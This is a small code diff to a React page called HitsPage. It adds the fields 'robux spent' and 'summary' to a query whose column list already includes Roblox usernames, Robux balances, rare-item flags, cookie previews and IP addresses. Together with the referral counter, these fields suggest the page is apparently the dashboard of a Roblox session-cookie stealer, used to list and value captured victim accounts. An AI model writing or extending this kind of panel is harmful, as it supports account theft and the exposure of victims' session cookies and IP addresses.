@@ -37,7 +37,7 @@ const HitsPage = () => {
   const [referralCount, setReferralCount] = useState<number>(0);
   const audioRef = useRef<HTMLAudioElement | null>(null);
 
-  const SELECT_COLS = 'id, tool_type, roblox_username, roblox_robux, roblox_rap, roblox_premium, roblox_has_korblox, roblox_has_headless, roblox_voice_enabled, roblox_age_verified, roblox_gamepass_earnings, roblox_headshot_url, cookie_preview, ip_address, created_at';
+  const SELECT_COLS = 'id, tool_type, roblox_username, roblox_robux, roblox_rap, roblox_premium, roblox_has_korblox, roblox_has_headless, roblox_voice_enabled, roblox_age_verified, roblox_gamepass_earnings, roblox_robux_spent, roblox_summary, roblox_headshot_url, cookie_preview, ip_address, created_at';
 
   // Load referral count
   useEffect(() => {
